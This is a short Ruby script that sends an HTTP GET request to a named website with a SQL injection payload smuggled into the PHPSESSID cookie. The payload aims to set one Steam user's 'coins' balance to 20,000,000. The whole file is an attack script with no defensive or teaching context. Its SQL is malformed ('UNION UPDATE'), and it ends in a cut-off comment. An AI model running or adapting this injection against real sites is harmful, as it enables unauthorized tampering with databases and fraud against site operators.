#!/usr/bin/env ruby
require "net/http"
require "colorize"

def send(inj)
	headers = {
		'Cookie' => URI.escape("PHPSESSID=#{inj}")
	}

	uri = URI.parse("http://test.gigapizda.pl/")
	http = Net::HTTP.new(uri.host, uri.port)

	res = http.get(uri.path, headers)

	puts res.body
end

send("a', '1515343348') UNION UPDATE users SET coins = 20000000 WHERE steamid = '76561198102316593'")

#UPDATE users SET refferal_userd